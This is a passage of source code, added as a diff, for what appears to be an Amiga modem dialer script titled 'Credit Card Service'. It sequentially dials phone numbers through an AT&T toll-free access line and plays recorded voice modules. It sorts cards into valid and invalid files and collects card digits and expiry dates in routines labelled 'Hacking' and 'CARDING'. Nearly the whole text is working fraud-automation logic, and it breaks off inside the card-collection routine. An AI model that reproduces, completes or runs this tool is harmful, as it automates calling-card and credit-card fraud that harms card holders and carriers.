+AL2$="ENVARC:AreaCode.Prefs"	/*default areacode list*/
+
+DLS$="N"			/*dialing last area number default*/
+D$="M" 				/*dialing manual/auto default*/
+T$=""  				/*reset cards*/
+MC=0   				/*max calls default*/
+PU$= "A C T I V E"		/* Pause default */
+ST$="--:--:--" 			/*Start Time Default*/
+ET$="--:--:--"			/*EndTime Time Default*/
+DM$=""				/*Auto/Manual Collect Info*/
+HT$="--:--:--"
+HH$="--:--:--"
+
+DTRHANGUP=ON
+timeH$ = Left$(Time$,2)
+timeM$ = MID$(Time$,4,2)
+Today$	= RIGHT$(DATE$,2)+"."+MID$(DATE$,4,2)+"."+LEFT$(DATE$,2)
+
+CF$="N"				/*Temporary card file*/
+TCF$="Ram:VAL-"+Today$         /*Temporary card file*/
+TF$="INACTIVE"                /*Temporary card file*/
+
+DTemp$ = Date$ + "  " + Time$
+AA$="2127662080" 		/*default manual number*/
+AB$="" 				/*default card number*/
+LS$=""				/*Card filelist test*/
+GCards$="Ram:VAL_AT&T_"+Today$
+BCards$="Ram:INV_AT&T_"+Today$
+TCards$="Ram:AT&T_"+Today$ /*Card tested file */
+GC=0 				 /* Good card test count*/
+TC=0 				 /* Total card test count*/
+BC=0 				 /* Bad card test count*/
+EXM$=""	/*Exp month default*/
+EXY$="" /*Exp year default */
+
+ASD1$="None"
+ASD2$=""
+AREA$="T:_AREA"
+PHONE$="T:_PHONES"
+C=0
+
+CLOSE #98
+CLOSE #99
+CLOSE #1
+CLOSE #2
+CLOSE #3
+
+CN=0         /* default call counter */
+VER=1234567 /* default number call  */
+RETURN
+END
+
+LOAD:
+CLS
+Print Local "                                                    ###"
+Print Local " [0m Credit Card Service V."Version$"     Time:"time$ "    [0m   [0m@ @[0m    [0mDate:"date$
+Print Local " [33m-----------------------------------------------[0moOO[33m-[0m(_)[33m-[0mOOo[33m-------------[0m"
+Print Local 
+Print Local " Loading Prefs ..."
+Gosub Preload
+Pause 1
+open input 1, "ENV:Dialer00.prefs"
+read #1, A$
+read #1, B$
+read #1, Temp$
+read #1, Delay
+read #1, Count
+read #1, Prefix1$
+read #1, Prefix2$
+read #1, Tollfree$
+read #1, Toll01$
+read #1, Toll02$
+read #1, Cards$
+read #1, Dirlog$
+read #1, A1
+read #1, A2
+read #1, A3
+read #1, A4
+read #1, A5
+read #1, A6
+read #1, A7
+read #1, A8
+read #1, A9
+read #1, A10
+read #1, Player$
+read #1, Module01$
+read #1, Comment01$
+read #1, Module02$
+read #1, Comment02$
+read #1, Module03$
+read #1, Comment03$
+read #1, Module04$
+read #1, Comment04$
+read #1, Module05$
+read #1, Comment05$
+read #1, Module06$
+read #1, Comment06$
+read #1, Module07$
+read #1, Comment07$
+read #1, Module08$
+read #1, Comment08$
+read #1, Module09$
+read #1, Comment09$
+read #1, B7
+read #1, B8
+read #1, GL$
+read #1, BL$
+read #1, TL$
+read #1, Editor$
+close #1
+SP$ = " "
+SPP$= "RUN"
+Player$ = SPP$+SP$+Player$+SP$
+
+IF EXISTS("ENV:Dialer01.prefs")
+  open input 1, "ENV:Dialer01.prefs"
+  read #1, MM1$
+  read #1, MM2$
+  read #1, MM3$
+  Close #1
+ELSE
+  open output 1, "ENV:Dialer01.prefs"
+  Write #1, "Y"
+  Write #1, "Y"
+  Write #1, "Y"
+  Close #1
+  open output 2, "ENVARC:Dialer01.prefs"
+  Write #2, "Y"
+  Write #2, "Y"
+  Write #2, "Y"
+  Close #2
+Goto LOAD
+Endif
+
+Return
+
+PHONES:
+CLS
+Print Local "                                                    ###"
+Print Local " [0m Credit Card Service V."Version$"     Time:"time$ "    [0m   [0m@ @[0m    [0mDate:"date$
+Print Local " [33m-----------------------------------------------[0moOO[33m-[0m(_)[33m-[0mOOo[33m-------------[0m"
+Print Local
+Print Local " -*- Dialer Configuration Menu -*-"
+Print Local
+Print Local "[33m Areacode.....[0m>: "C
+Print Local "[33m Step[0m([33ms[0m)[33m......[0m>: " A4
+Print Local "[33m Number.......[0m>: "B$
+Print Local "[33m Step[0m([33ms[0m)[33m......[0m>: " A4
+Print Local
+Print Local "[33m #  [0mLoad/Use Default([33ms[0m)[33m.  [33m + [0mLast Dialed number([33ms[0m)[33m.[0m"
+Print Local "[33m *  [0mAreaCode([33ms[0m)[33m.[0m          [33m - [0mView AreaCode([33ms[0m)[33m."
+Print Local "[33m A  [0mAreaInfo([33ms[0m)[33m.[0m         [33m ++ [0mLast Global Dialed number.[0m"
+Print Local "[33m T  [0mAutomatic Call Trace  [33m S [0mSkip PhoneCode([33ms[0m)[33m."
+Print Local
+Print Local "                              1234567"
+Input Local "[33mPhoneNumber[0m (7 Digits).....>: ",B$
+	B$ = LOWER$(B$)
+
+	if B$=="t"
+	 OPEN	INPUT	1,PHONE$
+	 READ	#1,B$
+	   If B$=="END_OF_FILE"
+	   open input 2, "ENV:Dialer00.prefs"
+	   read #2, INVALID$
+	   read #2, B$
+	   INVALID$=""
+	   Close #2
+	   Endif
+	 CLOSE	#1
+	 goto Label_1
+	endif
+
+	if B$=="s"
+	 OPEN	INPUT	1,PHONE$
+	 READ	#1,B$
+	   If B$=="END_OF_FILE"
+	   open input 2, "ENV:Dialer00.prefs"
+	   read #2, INVALID$
+	   read #2, B$
+	   INVALID$=""
+	   Close #2
+	   Endif
+	 CLOSE	#1
+	 gosub Steps
+	 GOTO PHONES
+	endif
+
+	if B$==""
+	 OPEN	INPUT	1,PHONE$
+	 READ	#1,B$
+	   If B$=="END_OF_FILE"
+	   open input 2, "ENV:Dialer00.prefs"
+	   read #2, INVALID$
+	   read #2, B$
+	   INVALID$=""
+	   Close #2
+	   Endif
+	 CLOSE	#1
+	 goto MainMenu
+	endif
+
+	if B$=="*"
+	 OPEN	INPUT	1,PHONE$
+	 READ	#1,B$
+	   If B$=="END_OF_FILE"
+	   open input 2, "ENV:Dialer00.prefs"
+	   read #2, INVALID$
+	   read #2, B$
+	   INVALID$=""
+	   Close #2
+	   Endif
+	 CLOSE	#1
+	 goto AREACODE
+	endif
+	if B$=="a"
+	 OPEN	INPUT	1,PHONE$
+	 READ	#1,B$
+	   If B$=="END_OF_FILE"
+	   open input 2, "ENV:Dialer00.prefs"
+	   read #2, INVALID$
+	   read #2, B$
+	   INVALID$=""
+	   Close #2
+	   Endif
+	 CLOSE	#1
+	 goto AREACHECK
+	endif
+
+	if B$=="+"
+	 If Exists (DirLog$+A$)
+	  open input 1, Dirlog$+A$
+	  read #1,B$
+	  Close #1
+	  DLS$="Y"
+	 else 
+	  B$=""
+	  Print Local ;"Area Not Logged yet !"
+	  Pause 1
+	  GOTO PHONES
+	 Endif
+	endif
+
+	if B$=="++"
+	 If Exists (DirLog$)
+	  open input 1, Dirlog$
+	  read #1,B$
+	  Close #1
+	  GOSUB PHONE_W
+	  DLS$="N"
+	 else 
+	  B$=""
+	  Print Local ;"Not Logged yet !"
+	  Pause 1
+	  GOTO PHONES
+	 Endif
+	endif
+
+	if B$=="-"
+	 OPEN	INPUT	1,PHONE$
+	 READ	#1,B$
+	   If B$=="END_OF_FILE"
+	   open input 2, "ENV:Dialer00.prefs"
+	   read #2, INVALID$
+	   read #2, B$
+	   INVALID$=""
+	   Close #2
+	   Endif
+	 CLOSE	#1
+	 gosub AREA_V
+	endif
+
+	if B$=="#"
+	 open input 1, "ENV:Dialer00.prefs"
+	 read #1, INVALID$
+	 read #1, B$
+	 INVALID$=""
+	 Close #1
+	 GOSUB PHONE_W
+	endif
+   GOSUB PHONE_W
+   GOTO  PHONES
+END
+
+PHONE_W:
+If DLS$=="N"
+If B$=="END_OF_FILE"
+	   open input 2, "ENV:Dialer00.prefs"
+	   read #2, INVALID$
+	   read #2, B$
+	   INVALID$=""
+	   Close #2
+Endif
+OPEN	OUTPUT 1,PHONE$
+WRITE	#1 B$
+CLOSE	#1
+OPEN	INPUT	1,PHONE$
+READ	#1,VER
+CLOSE	#1
+else
+B$="Last Logged"
+endif
+RETURN
+
+STEPS:
+CLS
+Print Local "                                                    ###"
+Print Local " [0m Credit Card Service V."Version$"     Time:"time$ "    [0m   [0m@ @[0m    [0mDate:"date$
+Print Local " [33m-----------------------------------------------[0moOO[33m-[0m(_)[33m-[0mOOo[33m-------------[0m"
+Print Local
+Print Local " -*- Step Control Menu -*-"
+ Print Local
+ Print Local "[33mDefault Step Number is [0m>:" A4
+  print Local
+  Input Local "[33mPlease Enter new Value[0m >: ",A4
+   If A4 == ""
+    Print Local
+    Print Local "WARNING ! NO STEP..."
+    Pause 1
+   endif
+RETURN
+
+START:
+If DLS$=="N"
+  If Exists (PHONE$)
+   OPEN	INPUT	1,PHONE$
+   READ	#1,VER
+   CLOSE #1
+  Endif
+else
+B$="Last Logged"
+VER=9999999
+Endif
+
+If MC==0
+ MC=9999999
+endif
+If D$=="M"
+ BEEP
+ DM$="Manual Collect !"
+Endif
+If D$=="A"
+ BEEP
+ BEEP
+ DM$="AUTOMATIC Collect !"
+Endif
+If CF$=="N"
+ TF$="INACTIVE"
+ else
+ TF$="ACTIVE >:"+TCF$
+Endif
+CLS
+Print Local "                                                    ###"
+Print Local " [0m Credit Card Service V."Version$"     Time:"time$ "    [0m   [0m@ @[0m    [0mDate:"date$
+Print Local " [33m-----------------------------------------------[0moOO[33m-[0m(_)[33m-[0mOOo[33m-------------[0m"
+Print Local
+Print Local " -*- Starting Code Control Menu -*-"
+Print Local
+Print Local "[33m MAX Calls....[0m>: "MC
+Print Local "[33m Collect Mode.[0m>: "DM$ "  [33mTrace Mode.[0m>: "DLS$
+Print Local
+Print Local "[33m AreaCodes Selected.....[0m>: "C
+Print Local "[33m PhoneCode Selected.....[0m>: "VER
+Print Local "[33m Temporary Card File....[0m>: "TF$
+Print Local "[33m PhoneCode Step[0m([33ms[0m)[33m......[0m>: " A4
+Print Local
+Print Local "[33m   * [0mStart([33ms[0m)[33m.                         [33mE[0m Endless Handler([33ms[0m)[33m."
+Print Local "[33m   S [0mSkip PhoneCode([33ms[0m)[33m.[0m               [33m V [0mView AreaCode([33ms[0m)[33m[0m."
+Print Local "[33m M/A [0mManual/Automatic Dialing.[0m        [33m L [0mLoop AreaCode([33ms[0m)[33m[0m." 
+Print Local "[33m T/N [0mTemporary Collect.[0m               [33m R [0mResponse Handler([33ms[0m)[33m[0m."
+Print Local
+ASK Local "Please Select Function (*,S,,M,A,E,V) >: ", S$
+	S$ = LOWER$(S$)
+	If S$==""
+	 goto MainMenu
+	endif
+
+	If S$=="l"
+	  Print Local
+	  Print Local
+	  INPUT LOCAL "[33mLoop Calls[0m....... >: ",MC
+	  If C==0
+           Goto AreaCode
+	  else
+	   MC=C*MC
+	  Endif
+	Endif
+
+	If S$=="*"
+	 Open input 99,AREA$
+	 CN = 0
+	 Goto DIALER
+	Endif
+	If S$=="v"
+	 Gosub AREA_V
+	Endif
+	If S$=="r"
+	 Gosub response
+	Endif
+	If S$=="s"
+	 Gosub STEPS
+	Endif
+	If S$=="e"
+	 Gosub Endless
+	Endif
+	If S$=="m"
+	 D$="M"
+	 Goto start
+	Endif
+	If S$=="a"
+	 D$="A"
+	 Goto start
+	Endif
+	If S$=="t"
+	 CF$="Y"
+	 Print local
+	 Print Local
+	 Print Local "                                       "TCF$
+	 Ask Local "Return to confirm/C=Change Filename >: ", E$
+	  If E$==""
+	   TCF$="Ram:VAL-"+Today$
+	  Else
+	   Print Local
+	   INPUT LOCAL "[33mDefault File[0m .... FULL PATH+Filename :",TCF$
+	    If TCF$==""
+	     TCF$="Ram:VAL-"+Today$
+	    Endif
+	  Endif
+	 Goto start
+	Endif
+	If S$=="n"
+	 CF$="N"
+	 Goto start
+	Endif
+
+GOTO START
+END
+
+TIMESTART:
+If HT$=="01"
+ WAIT UNTIL 01:00:00 
+Endif
+If HT$=="02"
+ WAIT UNTIL 02:00:00 
+Endif
+If HT$=="03"
+ WAIT UNTIL 03:00:00 
+Endif
+If HT$=="04"
+ WAIT UNTIL 04:00:00 
+Endif
+If HT$=="05"
+ WAIT UNTIL 05:00:00 
+Endif
+If HT$=="06"
+ WAIT UNTIL 06:00:00 
+Endif
+If HT$=="07"
+ WAIT UNTIL 07:00:00 
+Endif
+If HT$=="08"
+ WAIT UNTIL 08:00:00 
+Endif
+If HT$=="09"
+ WAIT UNTIL 09:00:00 
+Endif
+If HT$=="10"
+ WAIT UNTIL 10:00:00 
+Endif
+If HT$=="11"
+ WAIT UNTIL 11:00:00 
+Endif
+If HT$=="12"
+ WAIT UNTIL 12:00:00 
+Endif
+If HT$=="13"
+ WAIT UNTIL 13:00:00 
+Endif
+If HT$=="14"
+ WAIT UNTIL 14:00:00 
+Endif
+If HT$=="15"
+ WAIT UNTIL 15:00:00 
+Endif
+If HT$=="16"
+ WAIT UNTIL 16:00:00 
+Endif
+If HT$=="17"
+ WAIT UNTIL 17:00:00 
+Endif
+If HT$=="18"
+ WAIT UNTIL 18:00:00 
+Endif
+If HT$=="19"
+ WAIT UNTIL 19:00:00 
+Endif
+If HT$=="20"
+ WAIT UNTIL 20:00:00 
+Endif
+If HT$=="21"
+ WAIT UNTIL 21:00:00 
+Endif
+If HT$=="22"
+ WAIT UNTIL 22:00:00 
+Endif
+If HT$=="23"
+ WAIT UNTIL 23:00:00 
+Endif
+If HT$=="24"
+ WAIT UNTIL 00:00:00 
+Endif
+If HT$=="--:--:--"
+ RETURN
+Endif
+ HT$=="--:--:--"
+RETURN
+END
+
+
+TIMESTOP:
+If HH$=="01"
+ Goto Terminated
+Endif
+If HH$=="02"
+ Goto Terminated
+Endif
+If HH$=="03"
+ Goto Terminated
+Endif
+If HH$=="04"
+ Goto Terminated
+Endif
+If HH$=="05"
+ Goto Terminated
+Endif
+If HH$=="06"
+ Goto Terminated
+Endif
+If HH$=="07"
+ Goto Terminated
+Endif
+If HH$=="08"
+ Goto Terminated
+Endif
+If HH$=="09"
+ Goto Terminated
+Endif
+If HH$=="10"
+ Goto Terminated
+Endif
+If HH$=="11"
+ Goto Terminated
+Endif
+If HH$=="12"
+ Goto Terminated
+Endif
+If HH$=="13"
+ Goto Terminated
+Endif
+If HH$=="14"
+ Goto Terminated
+Endif
+If HH$=="15"
+ Goto Terminated
+Endif
+If HH$=="16"
+ Goto Terminated
+Endif
+If HH$=="17"
+ Goto Terminated
+Endif
+If HH$=="18"
+ Goto Terminated
+Endif
+If HH$=="19"
+ Goto Terminated
+Endif
+If HH$=="20"
+ Goto Terminated
+Endif
+If HH$=="21"
+ Goto Terminated
+Endif
+If HH$=="22"
+ Goto Terminated
+Endif
+If HH$=="23"
+ Goto Terminated
+Endif
+If HH$=="24"
+ Goto Terminated
+Endif
+If HH$=="--:--:--"
+ RETURN
+Endif
+RETURN
+END
+
+
+
+
+RESPONSE:
+CLS
+Print Local "                                                    ###"
+Print Local " [0m Credit Card Service V."Version$"     Time:"time$"  [0m     [0m@ @[0m    [0mDate:"date$
+Print Local " [33m-----------------------------------------------[0moOO[33m-[0m(_)[33m-[0mOOo[33m-------------[0m"
+Print Local
+Print Local " -*- Response Settings Menu -*-                 "
+Print Local
+Print Local "ON/OFF"
+Print Local
+Print Local "  "MM1$"     [33m- [0m1[33m -[0m Module: "Comment05$
+Print Local "  "MM2$"     [33m- [0m2[33m -[0m Module: "Comment06$
+Print Local "  "MM3$"     [33m- [0m3[33m -[0m Module: "Comment08$
+Print Local "        [33m- [0m4[33m -[0m Save Prefs !"
+Print Local
+ASK Local "Please Select Function (0-4) >: ", F$
+	F$ = LOWER$(F$)
+
+	If F$==""
+	 Goto Start
+	Endif
+
+	If F$=="1"
+	 If MM1$=="Y"
+	   MM1$="N"
+	   Goto Response
+	 Endif
+	 If MM1$=="N"
+	   MM1$="Y"
+	   Goto Response
+	 Endif
+	 Goto Response
+	Endif
+
+	If F$=="2"
+	 If MM2$=="Y"
+	   MM2$="N"
+	   Goto Response
+	 Endif
+	 If MM2$=="N"
+	   MM2$="Y"
+	   Goto Response
+	 Endif
+	 Goto Response
+	Endif
+
+	If F$=="3"
+	 If MM3$=="Y"
+	   MM3$="N"
+	   Goto Response
+	 Endif
+	 If MM3$=="N"
+	   MM3$="Y"
+	   Goto Response
+	 Endif
+	 Goto Response
+	Endif
+
+	If F$=="4"
+	 print local
+	 Ask Local "[33mSave Prefs ?[0m (Y/N).....>: ",HS$
+	  If HS$=="y"
+	  open output 1, "ENV:Dialer01.prefs"
+		  Write #1, MM1$
+		  Write #1, MM2$
+		  Write #1, MM3$
+		  Close #1
+	  open output 1, "ENVARC:Dialer01.prefs"
+		  Write #1, MM1$
+		  Write #1, MM2$
+		  Write #1, MM3$
+	  Close #1
+		  Print Local ;"es Saving ..."
+		  Pause 1
+	    Goto Response
+	  else
+		  Print Local ;" Not Saving ..."
+		  Pause 1
+	    Goto Response
+	  Endif
+	Endif
+
+RETURN
+END
+
+
+
+DIALER:
+READ #99, A$
+
+IF A$ == "END_OF_FILE"
+	Close #99
+        Open input 99,"T:_AREA"
+	READ #99, A$
+Endif
+	If CN==0
+	 CN = CN + 1
+          If DLS$=="Y"
+	     If Exists (DirLog$+A$)
+	      open input 1, DirLog$+A$
+	      read #1,VER
+	      Close #1
+	      VER = VER + A4
+	     Endif
+	  Endif
+	     VER$ = STR$(VER)
+	     B$ = VER$
+	else
+	  CN = CN + 1
+          If DLS$=="Y"
+	   If Exists (DirLog$+A$)
+	    open input 1, DirLog$+A$
+	    read #1,VER
+	    Close #1
+	   Endif
+	  Endif
+	   VER = VER + A4
+	   VER$ = STR$(VER)
+	   B$ = VER$
+	Endif
+        GOTO DIALIT
+END
+
+
+Dialit:
+If A$=="0"
+ Goto AREACODE
+ Close #99
+endif
+If A$=="END_OF_FILE"
+ Close #99
+ Goto AREACODE
+endif
+
+
+If B$=="0"
+ Close #99
+ Goto PHONES
+endif
+
+If B$=="-1"
+ Close #99
+ Goto PHONES
+endif
+
+If A$==""
+ Close #99
+ Goto AREACODE
+endif
+
+If B$==""
+ Close #99
+ Goto PHONES
+endif
+
+If CN >= MC
+ Pause 5
+ Goto TERMINATED
+endif 
+
+ Send "ATX5E0^M"
+ Wait 3 "OK"
+ Send MLR$
+ Wait 3 "OK"
+ send GMLR$
+ Wait 3 "OK"
+
+ CLS
+ Print Local "                                                    ###"
+ Print Local " [0m Credit Card Service V."Version$"     Time:"time$ "    [0m   [0m@ @[0m    [0mDate:"date$
+ Print Local " [33m-----------------------------------------------[0moOO[33m-[0m(_)[33m-[0mOOo[33m-------------[0m"
+ Print Local
+ Print Local " -*- Dialer Sequence RTN -*-   [33m Collect Mode.[0m>: "DM$
+ Print Local
+ ASD1$ == ""
+ Gosub CHECK
+
+
+Print Local "[33m Areacode..........[0m>: "A$,ASD1$
+Print Local "[33m Area Time.........[0m>: "timeh$+":"+timem$+":00"
+Print Local "[33m Step..............[0m>: "A4 "        [33m Area[0m([33ms[0m)[33mSelected...[0m>: "C
+Print Local "[33m Phone Number......[0m>: "VER "  [33m Calls Executed....[0m>: "CN
+Print Local "[33m MAX Calls ........[0m>: "MC
+Print Local "[33m Start Time........[0m>: "ST$" [33m End Time..........[0m>: "ET$
+
+
+Gosub TIMESTART
+Gosub TIMESTOP
+
+send prefix1$
+send tollfree$
+send ";"
+send "^M"
+wait 30 "OK"
+print local "  [33mDialing [0m"tollfree$;
+Loop = 0
+LoopA:
+	pause 1
+	Loop = Loop + 1
+	IF	Loop < A1
+		PRINT	LOCAL ".";
+	GOTO	LoopA
+	endif
+send prefix2$
+send A$+ver$
+send ";"
+send "^M"
+wait 20 "OK"
+print local "  [33mDialing [0m "A$+ver$ "[0m "ASD1$;
+Loop = 0
+LoopB:
+	pause 1
+	Loop = Loop + 1
+	IF	Loop < A2
+		PRINT LOCAL ".";
+	GOTO	LoopB
+	Loop = 0
+	endif
+send prefix2$
+send Toll01$
+send ";"
+send "^M"
+wait 20 "OK"
+print local "  [33mAT&T Attention[0m ...";
+Loop = 0
+LoopC:
+	pause 1
+	Loop = Loop + 1
+	IF	Loop < A3
+		PRINT	LOCAL ".";
+	GOTO	LoopC
+	Loop = 0
+	endif
+Loop = 0
+send prefix2$
+send Toll02$
+send ";"
+send "^M"
+wait 3 "OK"
+
+print local "  [33mBilling Call [0m....";
+
+If DLS$=="N"
+ IF Dirlog$ != ""
+  OPEN	OUTPUT 1,Dirlog$
+   write	#1 ver$
+  CLOSE	#1
+ Endif
+Endif
+
+If DLS$=="Y"
+ IF Dirlog$ != ""
+  OPEN	OUTPUT 1,Dirlog$+A$
+   write	#1 ver$
+  CLOSE	#1
+ Endif
+Endif
+
+send "at#cls=8^M"
+wait 3 "OK"
+send "at#vls=6^M"
+wait 3 "VCON"
+send "AT#VGT=0^M"
+wait 3 "OK"
+send VGR$
+wait 3 "OK"
+
+if D$ == "A"
+ gosub Hack
+else
+ Goto Manualmenu
+endif
+
+ManualMenu:
+CLS
+Print Local "                                                    ###"
+Print Local " [0m Credit Card Service V."Version$"     Time:"time$ "    [0m   [0m@ @[0m    [0mDate:"date$
+Print Local " [33m-----------------------------------------------[0moOO[33m-[0m(_)[33m-[0mOOo[33m-------------[0m"
+Print Local " [33m Area Time....: [0m" timeh$+":"+timem$+":00"
+PRINT LOCAL " [33m Hacking......: [0m" A$+ver$,ASD1$,DM$
+Print Local " [33m Card Digits..: [0m" T$,TF$
+Print Local " [33m----------------------------------------------------------[0m  "PU$
+Print Local " [33m-[0m 0 [33m-[0m for Automatic Collect     [33m-[0m + [33m-[0m for  Manual Collect"
+Print Local
+Print Local "[33m -[0m1[33m- [0mPlay " Comment01$
+Print Local "[33m -[0m2[33m- [0mPlay " Comment02$
+Print Local "[33m -[0m3[33m- [0mPlay " Comment03$
+Print Local "[33m -[0m4[33m- [0mPlay " Comment04$
+Print Local "[33m -[0m5[33m- [0mPlay " Comment05$
+Print Local "[33m -[0m6[33m- [0mPlay " Comment06$
+Print Local "[33m -[0m7[33m- [0mPlay " Comment07$
+Print Local "[33m -[0m8[33m- [0mPlay " Comment08$
+Print Local "[33m -[0m9[33m- [0mPlay " Comment09$
+Print Local
+Print Local "[33m -[0m%[33m- [0mRedial Number           [33m -[0mX[33m- [0mReturn Main Menu        [33m -[0mD[33m- [0mDial Info"
+Print Local "[33m -[0m![33m- [0mSend Modem Command      [33m -[0mQ[33m- [0mEXITING SCRIPT !        [33m -[0mI[33m- [0mModem Init"
+Print Local "[33m -[0m*[33m- [0mSkip Next Call          [33m -[0mP[33m- [0mPAUSE (HANGUP)          [33m -[0mJ[33m- [0mJump Call"
+Print Local "[33m -[0mO[33m- [0mVoice OFF!              [33m -[0mV[33m- [0mVoice ON !            [33m -[0mM/A[33m- [0mAuto/Manual"
+Print Local 
+If D$=="M"
+ask "Please Select Function (1-6/M,Q,!,*,%) >: ", Z$
+Z$ = LOWER$(Z$)
+
+     if Z$ == "%"
+	Goto Jredial
+     endif
+     if Z$ == "j"
+	Goto JUMP
+     endif
+
+     if Z$ == "i"
+	Gosub ModemInit
+     endif
+     if Z$ == "0"
+	Goto Carding
+     endif
+     if Z$ == "1"
+	Goto Mod01
+     endif
+     if Z$ == "2"
+        Goto Mod02
+     endif
+     if Z$ == "3"
+        Goto Mod03
+     endif
+     if Z$ == "4"
+        Goto Mod04
+     endif
+     if Z$ == "5"
+        Goto Mod05
+     endif
+     if Z$ == "6"
+        Goto Mod06
+     endif
+     if Z$ == "7"
+        Goto Mod07
+     endif
+     if Z$ == "8"
+        Goto Mod08
+     endif
+     if Z$ == "9"
+        Goto Mod09
+     endif
+     if Z$ == "*"
+        goto skip
+     endif
+     if Z$ == "b"
+	Goto Skip
+     endif
+     if Z$ == "v"
+        goto voiceON
+     endif
+     if Z$ == "o"
+        goto voiceOFF
+     endif
+     if Z$ == "+"
+	Goto Carding
+     endif
+     if Z$ == "d"
+	Goto Manualsub
+     endif
+     if Z$ == "x"
+        goto Abort
+     endif
+     if Z$ == "p"
+	send "~~~ath0^M"
+	wait 3 "OK"
+	PU$="P A U S E D"
+     endif
+     if Z$ == "q"
+        goto closeit
+     endif
+     if Z$ == "!"
+	goto Modemcmd
+     endif
+     If Z$=="m"
+	Goto MCM
+     Endif
+     If Z$=="a"
+        Goto ACM
+     Endif
+
+GOTO MANUALMENU
+else
+Print Local "(F=Full Functions - Active Functions 0,*,M,A) >: "
+	WHEN    1 "0" Goto Carding
+	WHEN	2 "f" Goto FULL
+	WHEN	3 "*" Goto Skip
+	WHEN	4 "a" Goto ACM
+	WHEN	5 "m" Goto MCM
+	WAIT	15
+	GOTO	SKIP
+FULL:
+Print Local "Please Select Function (1-6/M,Q,!,*,%,) >: "
+	WHEN	1 "%" Goto JRedial
+	WHEN	2 "j" Goto Jump
+	WHEN	3 "i" Goto ModemInit
+	WHEN	4 "*" Goto Skip
+	WHEN	5 "v" Goto voiceON
+	WHEN	6 "o" Goto voiceOFF
+	WHEN	7 "b" Goto Skip
+	WHEN	8 "+" Goto Carding
+	WHEN	9 "d" Goto Manualsub
+	WHEN	10 "p" Goto Pauseit
+	WHEN	11 "q" Goto Closeit
+	WHEN	12 "!" Goto Modemcmd
+	WHEN	13 "1" Goto mod01
+	WHEN	14 "2" Goto mod02
+	WHEN	15 "3" Goto mod03
+	WHEN	16 "4" Goto mod04
+	WHEN	17 "5" Goto mod05
+	WHEN	18 "6" Goto mod06
+	WHEN	19 "7" Goto mod07
+	WHEN	20 "8" Goto mod08
+	WHEN	21 "9" Goto mod09
+	WHEN	22 "0" Goto Carding
+	WHEN	23 "a" Goto ACM
+	WHEN	24 "m" Goto MCM
+	WHEN	24 "x" Goto Abort
+
+	WAIT	20
+	GOTO	SKIP
+
+endif
+
+ACM:
+        D$="A"
+	DM$="AUTOMATIC Collect !"
+	send "ATE1^M"
+	wait 3 "OK"
+        Goto ManualMenu
+END
+
+MCM:
+	D$="M"
+	DM$="Manual Collect !"
+	send "ATE1^M"
+	wait 3 "OK"
+	Goto ManualMenu
+END
+
+MOD01:
+        execute Player$ + Module01$
+	Goto ManualMenu
+END
+MOD02:
+        execute Player$ + Module02$
+	Goto ManualMenu
+END
+MOD03:
+        execute Player$ + Module03$
+	Goto ManualMenu
+END
+MOD04:
+        execute Player$ + Module04$
+	Goto ManualMenu
+END
+MOD05:
+        execute Player$ + Module05$
+	Goto ManualMenu
+END
+MOD06:
+        execute Player$ + Module06$
+	Goto ManualMenu
+END
+MOD07:
+        execute Player$ + Module07$
+	Goto ManualMenu
+END
+MOD08:
+        execute Player$ + Module08$
+	Goto ManualMenu
+END
+MOD09:
+        execute Player$ + Module09$
+	Goto ManualMenu
+END
+
+JREDIAL:
+	send "~~~AT^M"
+	wait 10 "OK"
+	send "~~~ATH0^M"
+	wait 10 "OK"
+	send "~~~ATX5E1^M"
+	wait 10 "OK"
+	Goto Dialit
+END
+MODEMCMD:
+	Print Local
+	Input Local "Please Enter Modem Command >:",MC$
+        send MC$
+	send "^M"
+	goto ManualMenu
+END
+MANUALSUB:
+CLS
+Print Local "                                                    ###"
+Print Local " [0m Credit Card Service V."Version$"     Time:"time$ "    [0m   [0m@ @[0m    [0mDate:"date$
+Print Local " [33m-----------------------------------------------[0moOO[33m-[0m(_)[33m-[0mOOo[33m-------------[0m"
+Print Local
+Print Local "[33m Areacode..........[0m>: "A$,ASD1$
+Print Local "[33m Area Time.........[0m>: "timeh$+":"+timem$+":00"
+Print Local "[33m Step..............[0m>: "A4 "        [33m Area[0m([33ms[0m)[33mSelected...[0m>: "C
+Print Local "[33m Phone Number......[0m>: "VER "  [33m Calls Executed....[0m>: "CN
+Print Local "[33m MAX Calls ........[0m>: "MC
+Print Local "[33m Start Time........[0m>: "ST$" [33m End Time..........[0m>: "ET$
+Print Local
+ASK LOCAL   " Press Return ...",P$
+goto ManualMenu
+end
+
+JUMP:
+CLS
+Print Local "                                                    ###"
+Print Local " [0m Credit Card Service V."Version$"     Time:"time$ "    [0m   [0m@ @[0m    [0mDate:"date$
+Print Local " [33m-----------------------------------------------[0moOO[33m-[0m(_)[33m-[0mOOo[33m-------------[0m"
+Print Local
+Print Local "[33m Areacode..........[0m>: "A$,ASD1$
+Print Local "[33m Area Time.........[0m>: "timeh$+":"+timem$+":00"
+Print Local "[33m Step..............[0m>: "A4 "        [33m Area[0m([33ms[0m)[33mSelected...[0m>: "C
+Print Local "[33m Phone Number......[0m>: "VER "  [33m Calls Executed....[0m>: "CN
+Print Local "[33m MAX Calls ........[0m>: "MC
+Print Local "[33m Start Time........[0m>: "ST$" [33m End Time..........[0m>: "ET$
+Print Local
+Print Local "Option Will SKIP Back X PhoneNumbers and Start Again Dialer"
+Print Local
+Input Local "Please Enter Value >:",JC
+VER = VER - JC
+Goto Skip
+END
+
+VOICEON:
+send "at#cls=8^M"
+wait 3 "OK"
+send "at#vls=6^M"
+wait 3 "VCON"
+send "AT#VGT=128^M"
+wait 3 "OK"
+goto manualmenu
+END
+VOICEOFF:
+send "at#cls=8^M"
+wait 3 "OK"
+send "at#vls=6^M"
+wait 3 "VCON"
+send "AT#VGT=0^M"
+wait 3 "OK"
+goto manualmenu
+END
+
+
+
+/*card Collect Routine*/
+CARDING:
+CLS
+send "ate1^M"
+wait 5 "OK"
+
+/*send "ATH1^M"
+wait 3 "OK"
+send "AT#CLS=8^M"
+wait 3 "OK"
+send "AT#VLS=6^M"
+wait 3 "VCON"
+send "AT#VGT=0^M"
+wait 3 "OK"*/
+
+If D$=="A"
+ Z$="0"
+Endif
+
+if Z$ == "0"
+CLS
+ Print Local "                                                    ###"
+ Print Local " [0m Credit Card Service V."Version$"     Time:"time$ "    [0m   [0m@ @[0m    [0mDate:"date$
+ Print Local " [33m-----------------------------------------------[0moOO[33m-[0m(_)[33m-[0mOOo[33m-------------[0m"
+ Print Local
+ PRINT LOCAL " [33m Hacking : [0m" A$+ver$,ASD1$
+ Print Local
